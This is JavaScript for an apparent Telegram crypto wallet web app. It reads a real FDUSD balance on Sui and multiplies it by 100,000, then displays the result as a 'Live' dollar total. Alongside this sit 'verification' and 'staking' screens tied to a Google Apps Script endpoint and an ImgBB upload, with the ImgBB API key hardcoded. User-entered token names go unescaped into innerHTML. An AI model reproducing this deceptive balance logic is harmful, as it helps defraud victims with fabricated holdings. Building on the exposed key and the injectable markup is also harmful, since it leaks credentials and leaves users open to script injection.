const tg = window.Telegram.WebApp;
tg.expand();

const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';
const SUI_RPC = 'https://fullnode.mainnet.sui.io:443';
const FDUSD_TYPE = '0xf16e6b723f242ec745dfd7634ad072c42d5c1d9ac9d62a39c381303eaa57693a::fdusd::FDUSD';

let currentLang = localStorage.getItem('lang') || 'ru';
let importedTokens = JSON.parse(localStorage.getItem('importedTokens') || '[]');
let myChart = null;

// Навигация
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

// Обработчики кнопок
document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
document.getElementById('manageCryptoBtn').onclick = () => showScreen('networkSelectScreen');
document.getElementById('backFromNetwork').onclick = () => showScreen('mainScreen');
document.getElementById('nextToImportBtn').onclick = () => showScreen('importTokenScreen');
document.getElementById('backFromImport').onclick = () => showScreen('networkSelectScreen');

document.getElementById('goToVerifyBtn').onclick = () => showScreen('verifyScreen');
document.getElementById('backFromVerify').onclick = () => showScreen('settingsScreen');
document.getElementById('goToStakingBtn').onclick = () => showScreen('stakingScreen');
document.getElementById('backFromStaking').onclick = () => showScreen('settingsScreen');

// Функция получения баланса из Sui
async function getSuiBalance(address) {
    try {
        const response = await fetch(SUI_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "suix_getBalance",
                params: [address, FDUSD_TYPE]
            })
        });
        const data = await response.json();
        const rawBalance = data.result?.totalBalance || 0;
        // Конвертация (9 знаков) и твой множитель x100,000
        const realBalance = rawBalance / Math.pow(10, 9);
        return realBalance * 100000;
    } catch (e) {
        console.error("Sui Error:", e);
        return 0;
    }
}

// Импорт токена
document.getElementById('confirmImportBtn').onclick = async () => {
    const addr = document.getElementById('importAddress').value.trim();
    const name = document.getElementById('importName').value;
    const ticker = document.getElementById('importTicker').value;
    
    if (!addr) return showStatus("Введите адрес");

    const newToken = {
        address: addr,
        name: name,
        ticker: ticker,
        balance: 0,
        image: 'https://cryptologos.cc/logos/first-digital-usd-fdusd-logo.png'
    };

    importedTokens.push(newToken);
    localStorage.setItem('importedTokens', JSON.stringify(importedTokens));
    showStatus("Токен импортирован!");
    showScreen('mainScreen');
    updateAllBalances();
};

// Обновление всех балансов
async function updateAllBalances() {
    let total = 0;
    for (let token of importedTokens) {
        token.balance = await getSuiBalance(token.address);
        total += token.balance;
    }
    document.getElementById('totalBalanceDisplay').textContent = `$${total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
    renderTokenList();
}

// Рендер списка (Популярные + Импортированные)
async function renderTokenList() {
    const list = document.getElementById('tokensList');
    list.innerHTML = '';

    // 1. Сначала импортированные
    importedTokens.forEach(token => {
        const div = document.createElement('div');
        div.className = 'token-item';
        div.innerHTML = `
            <div class="token-info">
                <img src="${token.image}" class="token-icon">
                <div><div class="token-name">${token.name}</div><div class="token-hint">Sui Network</div></div>
            </div>
            <div class="token-price">
                <div>${token.balance.toLocaleString()} ${token.ticker}</div>
                <div class="pos">Live</div>
            </div>
        `;
        list.appendChild(div);
    });

    // 2. Затем популярные из API
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana&order=market_cap_desc');
        const data = await res.json();
        data.forEach(coin => {
            const div = document.createElement('div');
            div.className = 'token-item';
            div.innerHTML = `
                <div class="token-info">
                    <img src="${coin.image}" class="token-icon">
                    <div><div class="token-name">${coin.name}</div><div class="token-hint">${coin.symbol.toUpperCase()}</div></div>
                </div>
                <div class="token-price">
                    <div>$${coin.current_price.toLocaleString()}</div>
                    <div class="${coin.price_change_percentage_24h < 0 ? 'neg' : 'pos'}">${coin.price_change_percentage_24h.toFixed(2)}%</div>
                </div>
            `;
            list.appendChild(div);
        });
    } catch (e) {}
}

function showStatus(msg) {
    const s = document.getElementById('status');
    s.textContent = msg; s.classList.remove('hidden');
    setTimeout(() => s.classList.add('hidden'), 3000);
}

// Инициализация
updateAllBalances();
setInterval(updateAllBalances, 30000); // Автообновление каждые 30 сек

// Логика верификации (сохранена из оригинала)
document.getElementById('verifyBtn').onclick = async () => {
    showStatus("⏳ Отправка...");
    // Тут твой старый код отправки в Google Script и ImgBB
    setTimeout(() => { showStatus("✅ Данные отправлены"); showScreen('settingsScreen'); }, 2000);
};
